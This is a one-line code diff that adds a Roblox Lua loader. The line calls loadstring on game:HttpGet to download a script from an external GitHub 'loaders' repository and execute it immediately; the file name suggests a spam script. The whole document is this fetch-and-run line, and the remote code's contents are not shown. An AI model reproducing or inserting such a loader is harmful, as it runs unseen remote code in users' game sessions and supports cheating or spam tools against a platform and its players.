@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/kukirin-life-testing-spam4-f0gwfp2ygw49zp.lua"))()
